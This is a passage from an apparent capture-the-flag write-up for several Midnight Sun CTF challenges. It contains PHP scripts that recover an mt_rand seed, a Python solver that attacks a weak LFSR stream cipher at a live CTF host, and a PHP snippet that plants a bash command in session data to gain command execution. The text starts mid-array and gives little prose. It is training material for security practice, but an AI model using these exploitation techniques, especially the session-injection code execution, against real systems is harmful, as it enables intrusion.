           [81, 99, 214, 233, 99, 202, 87, 29, 241, 81, 205, 233, 214, 75, 29, 87, 70, 75, 202, 214, 192, 253],
           [72, 32, 177, 52, 32, 218, 22, 188, 151, 72, 253, 52, 177, 69, 188, 22, 80, 69, 218, 67, 252, 37],
           [82, 237, 19, 174, 237, 24, 249, 167, 92, 82, 74, 174, 19, 77, 167, 249, 213, 77, 24, 151, 229, 207],
           [207, 174, 25, 35, 174, 69, 256, 172, 200, 207, 204, 35, 25, 199, 172, 256, 221, 199, 69, 45, 191, 243],
           [49, 64, 210, 204, 64, 209, 34, 5, 215, 49, 157, 204, 210, 4, 5, 34, 79, 4, 209, 49, 207, 172],
           [29, 38, 36, 248, 38, 247, 204, 152, 251, 29, 60, 248, 36, 69, 152, 204, 196, 69, 247, 239, 84, 174],
           [224, 239, 218, 172, 239, 201, 195, 244, 65, 224, 26, 172, 218, 207, 244, 195, 69, 207, 201, 175, 84, 153],
           [78, 13, 15, 73, 13, 218, 5, 165, 234, 78, 182, 73, 15, 216, 165, 5, 24, 216, 218, 68, 171, 235],
           [90, 229, 214, 62, 229, 25, 52, 161, 15, 90, 192, 62, 214, 256, 161, 52, 208, 256, 25, 184, 60, 229],
           [46, 231, 23, 166, 231, 179, 65, 212, 247, 46, 152, 166, 23, 12, 212, 65, 48, 12, 179, 192, 157, 92],
           [70, 80, 11, 57, 80, 226, 92, 24, 26, 70, 242, 57, 11, 254, 24, 92, 248, 254, 226, 198, 237, 233],
           [252, 166, 161, 84, 166, 215, 209, 231, 72, 252, 24, 84, 161, 156, 231, 209, 23, 156, 215, 195, 164, 225],
           [63, 26, 228, 71, 26, 189, 178, 8, 41, 63, 168, 71, 228, 49, 8, 178, 249, 49, 189, 240, 15, 216],
           [34, 210, 4, 64, 210, 228, 1, 78, 237, 34, 59, 64, 4, 74, 78, 1, 53, 74, 228, 163, 169, 61],
           [248, 38, 198, 96, 38, 225, 216, 23, 82, 248, 9, 96, 198, 207, 23, 216, 91, 207, 225, 213, 37, 200],
           [62, 65, 218, 222, 65, 197, 229, 43, 2, 62, 3, 222, 218, 50, 43, 229, 96, 50, 197, 182, 174, 43],
           [206, 173, 234, 94, 173, 46, 155, 203, 169, 206, 253, 94, 234, 160, 203, 155, 180, 160, 46, 171, 11, 239],
           [6, 68, 74, 168, 68, 233, 250, 165, 155, 6, 188, 168, 74, 6, 165, 250, 46, 6, 233, 178, 199, 88],
           [253, 34, 256, 254, 34, 167, 69, 78, 47, 253, 224, 254, 256, 154, 78, 69, 188, 154, 167, 90, 166, 185],
           [95, 241, 206, 15, 241, 52, 236, 194, 173, 95, 223, 15, 206, 210, 194, 236, 42, 210, 52, 256, 36, 187],
           [231, 173, 57, 44, 173, 162, 176, 253, 241, 231, 51, 44, 57, 68, 253, 176, 95, 68, 162, 242, 240, 6],
           [199, 1, 155, 42, 1, 202, 225, 201, 219, 199, 90, 42, 155, 53, 201, 225, 186, 53, 202, 81, 215, 222],
           [167, 56, 82, 228, 56, 223, 99, 39, 70, 167, 232, 228, 82, 44, 39, 99, 251, 44, 223, 21, 241, 227],
           [37, 219, 217, 38, 219, 51, 200, 175, 89, 37, 26, 38, 217, 218, 175, 200, 244, 218, 51, 226, 207, 154],
           [56, 52, 191, 12, 52, 38, 27, 73, 205, 56, 59, 12, 191, 25, 73, 27, 181, 25, 38, 2, 32, 96],
           [200, 46, 63, 57, 46, 85, 229, 32, 91, 200, 214, 57, 63, 68, 32, 229, 174, 68, 85, 92, 168, 49],
           [38, 51, 16, 51, 51, 49, 25, 255, 38, 38, 86, 51, 16, 37, 255, 25, 21, 37, 49, 84, 184, 54],
           [253, 206, 183, 10, 206, 47, 21, 211, 207, 253, 153, 10, 183, 46, 211, 21, 234, 46, 47, 223, 67, 168],
           [235, 175, 70, 5, 175, 190, 227, 249, 245, 235, 89, 5, 70, 194, 249, 227, 14, 194, 190, 72, 34, 86],
           [60, 40, 21, 220, 40, 211, 71, 216, 193, 60, 23, 220, 21, 44, 216, 71, 38, 44, 211, 150, 255, 232],
           [160, 54, 195, 221, 54, 150, 212, 163, 91, 160, 237, 221, 195, 7, 163, 212, 56, 7, 150, 156, 211, 49],
           [89, 224, 165, 225, 224, 54, 184, 157, 8, 89, 79, 225, 165, 49, 157, 184, 72, 49, 54, 58, 155, 201],
           [31, 155, 42, 49, 155, 22, 227, 34, 212, 31, 175, 49, 42, 70, 34, 227, 9, 70, 22, 243, 41, 192],
           [77, 41, 6, 91, 41, 37, 58, 250, 174, 77, 218, 91, 6, 31, 250, 58, 217, 31, 37, 176, 3, 184],
           [230, 28, 216, 18, 28, 76, 234, 60, 223, 230, 197, 18, 216, 226, 60, 234, 159, 226, 76, 93, 23, 150],
           [10, 235, 67, 162, 235, 72, 211, 179, 84, 10, 39, 162, 67, 158, 179, 211, 233, 158, 72, 4, 241, 250],
           [44, 244, 64, 37, 244, 249, 1, 220, 48, 44, 218, 37, 64, 50, 220, 1, 30, 50, 249, 38, 226, 19],
           [68, 51, 167, 19, 51, 50, 53, 28, 252, 68, 216, 19, 167, 79, 28, 53, 27, 79, 50, 208, 1, 224],
           [12, 28, 3, 155, 28, 78, 88, 152, 91, 12, 64, 155, 3, 82, 152, 88, 242, 82, 78, 226, 245, 1],
           [255, 31, 236, 37, 31, 226, 224, 72, 214, 255, 254, 37, 236, 256, 72, 224, 176, 256, 226, 44, 3, 68],
           [207, 233, 150, 6, 233, 232, 51, 55, 220, 207, 87, 6, 150, 229, 55, 51, 15, 229, 232, 74, 239, 216],
           [77, 198, 205, 57, 198, 51, 188, 198, 61, 77, 225, 57, 205, 152, 198, 188, 74, 152, 51, 82, 202, 209],
           [195, 151, 49, 223, 151, 220, 224, 183, 220, 195, 166, 223, 49, 33, 183, 224, 228, 33, 220, 69, 41, 7],
           [216, 161, 88, 65, 161, 49, 172, 8, 161, 216, 176, 65, 88, 83, 8, 172, 219, 83, 49, 89, 96, 207],
           [22, 190, 33, 155, 190, 168, 174, 231, 93, 22, 154, 155, 33, 213, 231, 174, 99, 213, 168, 250, 159, 4],
           [73, 45, 87, 23, 45, 99, 235, 21, 15, 73, 4, 23, 87, 85, 21, 235, 39, 85, 99, 40, 241, 224],
           [241, 240, 5, 189, 240, 255, 75, 6, 233, 241, 70, 189, 5, 225, 6, 75, 167, 225, 255, 31, 77, 154],
           [24, 159, 92, 16, 159, 3, 70, 23, 163, 24, 43, 16, 92, 215, 23, 70, 212, 215, 3, 66, 72, 24],
           [51, 45, 65, 62, 45, 63, 88, 204, 74, 51, 39, 62, 65, 179, 204, 88, 54, 179, 63, 187, 223, 68],
           [48, 67, 1, 188, 67, 2, 84, 47, 77, 48, 53, 188, 1, 168, 47, 84, 62, 168, 2, 216, 204, 70],
           [153, 229, 96, 94, 229, 237, 51, 201, 73, 153, 175, 94, 96, 208, 201, 51, 58, 208, 237, 60, 185, 189],
           [185, 223, 181, 89, 223, 185, 186, 253, 184, 185, 224, 89, 181, 165, 253, 186, 249, 165, 185, 227, 162, 63],
           [249, 240, 27, 70, 240, 7, 248, 173, 11, 249, 11, 70, 27, 85, 173, 248, 85, 85, 7, 34, 82, 59],
           [192, 232, 165, 205, 232, 95, 39, 163, 67, 192, 71, 205, 165, 99, 163, 39, 10, 99, 95, 73, 233, 166],
           [80, 198, 209, 213, 198, 41, 47, 158, 218, 80, 217, 213, 209, 252, 158, 47, 15, 252, 41, 73, 180, 89],
           [237, 82, 153, 207, 82, 195, 219, 195, 219, 237, 14, 207, 153, 243, 195, 219, 212, 243, 195, 169, 85, 163],
           [73, 45, 87, 23, 45, 99, 235, 21, 15, 73, 4, 23, 87, 85, 21, 235, 39, 85, 99, 40, 241, 224],
           [241, 21, 46, 91, 21, 19, 62, 13, 217, 241, 2, 91, 46, 15, 13, 62, 14, 15, 19, 22, 159, 151],
           [90, 37, 217, 91, 37, 82, 182, 244, 96, 90, 51, 91, 217, 64, 244, 182, 164, 64, 82, 211, 158, 46],
           [256, 7, 4, 23, 7, 80, 154, 233, 50, 256, 180, 23, 4, 192, 233, 154, 163, 192, 80, 237, 168, 256],
           [50, 175, 80, 46, 175, 222, 82, 251, 44, 50, 76, 46, 80, 46, 251, 82, 64, 46, 222, 220, 84, 62],
           [190, 197, 229, 55, 197, 83, 13, 81, 78, 190, 229, 55, 229, 32, 81, 13, 84, 32, 83, 1, 71, 81],
           [83, 210, 219, 32, 210, 202, 203, 153, 236, 83, 29, 32, 219, 242, 153, 203, 218, 242, 202, 57, 239, 78],
           [51, 22, 235, 179, 22, 47, 224, 164, 72, 51, 74, 179, 235, 234, 164, 224, 202, 234, 47, 91, 219, 220],
           [7, 251, 45, 41, 251, 208, 226, 33, 21, 7, 218, 41, 45, 67, 33, 226, 83, 67, 208, 253, 49, 8],
           [215, 162, 185, 254, 162, 162, 201, 63, 34, 215, 5, 254, 185, 186, 63, 201, 244, 186, 162, 165, 212, 256],
           [26, 167, 192, 177, 167, 53, 82, 206, 220, 26, 207, 177, 192, 74, 206, 82, 180, 74, 53, 2, 173, 166],
           [209, 248, 87, 152, 248, 73, 95, 210, 61, 209, 230, 152, 87, 66, 210, 95, 39, 66, 73, 160, 184, 236],
           [151, 169, 246, 96, 169, 234, 57, 39, 34, 151, 179, 96, 246, 178, 39, 57, 61, 178, 234, 238, 80, 73]]

def get_max(array):
    array.sort()
    max_difference = 0
    split_index = 0

    for i in range(1, len(array)):
        difference = array[i] - array[i - 1]
        if difference > max_difference:
            max_difference = difference
            split_index = i

    smaller_array = array[:split_index]

    smaller_array_max = max(smaller_array)
    return smaller_array_max

max_list = []
for i in samples:
    max_list.append(get_max(i))

counter = Counter(max_list)
most_common_count = counter.most_common(1)[0][1]

most_common_max = 0
for item, count in counter.items():
    if count == most_common_count and item > most_common_max:
        most_common_max = item

print(most_common_max)
```



```
<?php
session_start();

$flag = "midnight{";

function flag_to_numbers($flag)
{
    $numbers = [];
    foreach (str_split($flag) as $char) {
        $numbers[] = ord($char);
    }
    return $numbers;
}

function non_continuous_sample($min, $max, $gap_start, $gap_end)
{
    $rand_num = mt_rand($min, $max - ($gap_end - $gap_start));
    if ($rand_num >= $gap_start) {
        $rand_num += ($gap_end - $gap_start);
    }
    return $rand_num;
}

if (!str_starts_with($flag, "midnight{")) {
    echo "Come back later.n";
    exit();
}
$res = [81, 96, 235, 178, 96, 30, 241, 58, 68];

$flag_numbers = flag_to_numbers($flag);

// Maybe we can recover these constants
$min = 1;
$max = 256;
$gap_start = 99;
for ($gap_end = 99; $gap_end < 256; $gap_end++) {
    for ($seed = 0; $seed < 10000; $seed++) {
        $samples = [];
        foreach ($flag_numbers as $number) {
            mt_srand($seed + $number);
            $samples[] = non_continuous_sample($min, $max, $gap_start, $gap_end);
        }
        echo "$gap_end: $gap_end,seed: $seedn";
        if ($samples === $res) {
            var_dump("fuckyou");
            var_dump($seed);
            exit();
        }
    }
}
?>
```



```
<?php
function non_continuous_sample($min, $max, $gap_start, $gap_end, $seed)
{
    srand($seed);
    $rand_num = rand($min, $max - ($gap_end - $gap_start));
    if ($rand_num >= $gap_start) {
        $rand_num += $gap_end - $gap_start;
    }
    return $rand_num;
}

$min = 1;
$max = 256;
$gap_start = 99;
$gap_end = 149;
$seed = 7488;
function flag_to_numbers($flag)
{
    $numbers = [];
    foreach (str_split($flag) as $char) {
        $numbers[] = ord($char);
    }
    return $numbers;
}

$table = "1234567890qwertyuiopasdfghjklzxcvbnm_{}";
$table = flag_to_numbers($table);
$samples = [81, 96, 235, 178, 96, 30, 241, 58, 68, 81, 78, 178, 235, 171, 58, 241, 179, 171, 30, 65, 175, 8];
$c = 0;
$flag = "";
echo("[</br>");
foreach ($samples as $n) {
    foreach ($table as $t) {
        $generated_sample = non_continuous_sample($min, $max, $gap_start, $gap_end, $seed + $t);
        if ($generated_sample === $n) {
            echo("$c =>['" . chr($t) . "'],</br>");
        }
    }
    $c += 1;
}
echo("]</br>");
?>
```



```
[
0 =>['f'],
0 =>['m'],
1 =>['i'],
2 =>['u'],
2 =>['d'],
3 =>['n'],
4 =>['i'],
5 =>['2'],
5 =>['g'],
6 =>['h'],
7 =>['t'],
8 =>['{'],
9 =>['f'],
9 =>['m'],
10 =>['1'],
11 =>['n'],
12 =>['u'],
12 =>['d'],
13 =>['_'],
14 =>['t'],
15 =>['h'],
16 =>['3'],
17 =>['_'],
18 =>['2'],
18 =>['g'],
19 =>['4'],
19 =>['q'],
19 =>['x'],
20 =>['p'],
21 =>['j'],
21 =>['}'],
]
```



```
<?php

$chars = [
    0 => ['m'],
    1 => ['i'],
    2 => ['d'],
    3 => ['n'],
    4 => ['i'],
    5 => ['g'],
    6 => ['h'],
    7 => ['t'],
    8 => ['{'],
    9 => ['f', 'm'],
    10 => ['1'],
    11 => ['n'],
    12 => ['u', 'd'],
    13 => ['_'],
    14 => ['t'],
    15 => ['h'],
    16 => ['3'],
    17 => ['_'],
    18 => ['2', 'g'],
    19 => ['4', 'q', 'x'],
    20 => ['p'],
    21 => ['}']
];

function generate_combinations($chars, $index = 0, $current = "")
{
    if ($index >= count($chars)) {
        echo $current . PHP_EOL . "</br>";
        return;
    }

    foreach ($chars[$index] as $char) {
        generate_combinations($chars, $index + 1, $current . $char);
    }
}

generate_combinations($chars);

?>
```



```
midnight{f1nu_th3_24p}
midnight{f1nu_th3_2qp}
midnight{f1nu_th3_2xp}
midnight{f1nu_th3_g4p}
midnight{f1nu_th3_gqp}
midnight{f1nu_th3_gxp}
midnight{f1nd_th3_24p}
midnight{f1nd_th3_2qp}
midnight{f1nd_th3_2xp}
midnight{f1nd_th3_g4p}
midnight{f1nd_th3_gqp}
midnight{f1nd_th3_gxp}
midnight{m1nu_th3_24p}
midnight{m1nu_th3_2qp}
midnight{m1nu_th3_2xp}
midnight{m1nu_th3_g4p}
midnight{m1nu_th3_gqp}
midnight{m1nu_th3_gxp}
midnight{m1nd_th3_24p}
midnight{m1nd_th3_2qp}
midnight{m1nd_th3_2xp}
midnight{m1nd_th3_g4p}
midnight{m1nd_th3_gqp}
midnight{m1nd_th3_gxp}
```



```
midnight{s0me0ne_sh0u1d_f4cT_cH3ck_tH3s3_AIs}
```



```
import os
import zlib
from flask import Flask, request, jsonify
from secrets import token_bytes

app = Flask(__name__)

# The secret key and nonce for the DancingBits stream cipher
SECRET_KEY = int.from_bytes(token_bytes(4), 'big')
NONCE = int.from_bytes(token_bytes(4), 'big')

FLAG = ""

def lfsr(state):
    bit = ((state >> 31) ^ (state >> 21) ^ (state >> 1) ^ state) & 1
    return (state << 1) | bit

def rotl(x, k):
    return ((x << k) | (x >> (8 - k))) & 0xff

def swap(x):
    return ((x & 0x0f) << 4) | ((x & 0xf0) >> 4)

def dancingbits_encrypt(plaintext, key, nonce):
    state = (key << 32) | nonce
    ciphertext = bytearray()

    for byte in plaintext:
        state = lfsr(state)
        ks_byte = (state >> 24) & 0xff
        c = byte ^ ks_byte
        c = rotl(c, 3)
        c = swap(c)
        ciphertext.append(c)

    return ciphertext

def dancingbits_decrypt(ciphertext, key, nonce):
    state = (key << 32) | nonce
    plaintext = bytearray()

    for byte in ciphertext:
        state = lfsr(state)
        ks_byte = (state >> 24) & 0xff
        c = swap(byte)
        c = rotl(c, -3)
        p = c ^ ks_byte
        plaintext.append(p)

    return plaintext

@app.route('/encrypted_flag', methods=['GET'])
def encrypted_flag():
    compressed_flag = zlib.compress(FLAG.encode('utf-8'))
    encrypted_flag = dancingbits_encrypt(compressed_flag, SECRET_KEY, NONCE)
    return encrypted_flag

@app.route('/decrypt_oracle', methods=['POST'])
def decrypt_oracle():
    encrypted_data = request.data

    if len(encrypted_data) < 1:
        return jsonify(status=500, message="Error: Data too short")

    try:
        decrypted_data = dancingbits_decrypt(encrypted_data, SECRET_KEY, NONCE)
        decompressed_data = zlib.decompress(decrypted_data)

        for i in range(len(decompressed_data.decode('utf-8'))):
            if decompressed_data.decode('utf-8')[i] == FLAG[i]:
                return jsonify(status=500, message="Error: CTF character at index found: " + str(i))
        return jsonify(status=200, message="Success")
    except Exception as e:
        return jsonify(status=500, message="Error")

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8000)
```



```
import zlib, requests,sys
from secrets import token_bytes

def lfsr(state):
    bit = ((state >> 31) ^ (state >> 21) ^ (state >> 1) ^ state) & 1  # mask已知
    return (state << 1) | bit

def rotl(x, k):
    if k > 0:
        return ((x << k) | (x >> (8 - k))) & 0xff  # 高k位移到低k位
    if k < 0:
        return ((x >> -k) | (x << (8 + k))) & 0xff

def swap(x):
    return ((x & 0x0f) << 4) | ((x & 0xf0) >> 4)  # 前后4位交换

def find_max_same(a, b):
    for i in range(len(a)):
        if a[:i] != b[:i]:
            return a[:i - 1]

def dancingbits(cs, key, nonce):
    state = (key << 32) | nonce
    plain = []
    for c in cs:
        state = lfsr(state)
        ks_byte = (state >> 24) & 0xff
        c = swap(c)
        c = rotl(c, -3)
        m = c ^ ks_byte
        plain.append(m)
    return bytes(plain)

url = 'http://dancingbits-1.play.hfsc.tf:23105'
req = requests.get(url + '/encrypted_flag')
encrypted_flag = req.content
print(encrypted_flag)

FLAG = "midnight{"
c1 = zlib.compress(FLAG.encode('utf-8'))  # flag = zlib.decompress(compressed_flag)
FLAG = "midnight{asdfho234_dakjfbk2_0HB_test}"
c2 = zlib.compress(FLAG.encode('utf-8'))  # flag = zlib.decompress(compressed_flag)

known = find_max_same(c1, c2)
print(len(known))

NONCE = 0
SECRET_KEY = int.from_bytes(token_bytes(4), 'big')  # 无关紧要，随机取
for i in range(len(known)):
    c = encrypted_flag[i]
    c = swap(c)
    c = rotl(c, -3)
    ks_byte = c ^ known[i]
    if i == 0:
        NONCE = ks_byte
        print('ks =', bin(ks_byte)[2:].zfill(8))
    else:
        NONCE = (NONCE << 1) + (ks_byte & 1)

tmp = 32 - 19  # 实际测试测试，发现是 最高位未知+中间18位+低13位未知
NONCE1 = NONCE << tmp  # 0+xxx+x
for i in range(1 << tmp):
    NONCE1 += 1

    tmp_compressed_flag = dancingbits(encrypted_flag, SECRET_KEY, NONCE1)
    try:
        tmp_flag = zlib.decompress(tmp_compressed_flag)
    except:
        continue
    if b'midnight{' in tmp_flag:
        print(tmp_flag)
        sys.exit(1)

NONCE2 = (NONCE << tmp)+(1<<31)  # 1+xxx+x
for i in range(1 << tmp):
    NONCE2 += 1
    tmp_compressed_flag = dancingbits(encrypted_flag, SECRET_KEY, NONCE2)
    try:
        tmp_flag = zlib.decompress(tmp_compressed_flag)
    except:
        continue
    if b'midnight{' in tmp_flag:
        print(tmp_flag)
        sys.exit(1)
# midnight{th3_h0t_n3w_str3am_c1pher}
```



```
<?php
ini_set("allow_url_fopen", 0);
ini_set("allow_url_include", 0);
session_start();

if(isset($_GET['cmd'])){
    $_GET['cmd'](strval($_GET['path'])); # One argument for babies
    echo "Still no shell? ".$_SESSION['attempts']." tries and counting :-)<br>n";

    $_SESSION['attempts'] = (isset($_SESSION['attempts']) ? $_SESSION['attempts']+1 : $_SESSION['attempts']=1);

    if(isset($_GET['hiddenschmidden'])){
        $descriptorspec = array(
            0 => array("pipe", "r"),
            1 => array("pipe", "w")
        );
        $proc = proc_open(['chmod','+x',strval($_GET['path'])], $descriptorspec, $pipes);
        proc_close($proc);
        $proc = proc_open([strval($_GET['path'])], $descriptorspec, $pipes2); #No argument for haxors
        echo @stream_get_contents($pipes2[1]);
        proc_close($proc);
    }
    die();
}
```



```
<?php
session_start();
$exp = '#!/bin/bash
./flag_dispenser GIVEMEFLAG
';

$_SESSION[$exp] = '';
echo session_encode();
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/04/3-1681173999.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/04/8-1681174000.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/04/6-1681174000.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/04/10-1681174001.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/04/9-1681174001.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/04/5-1681174001.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/04/2-1681174002.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/04/7-1681174003.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/04/8-1681174003.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/04/1-1681174004.png)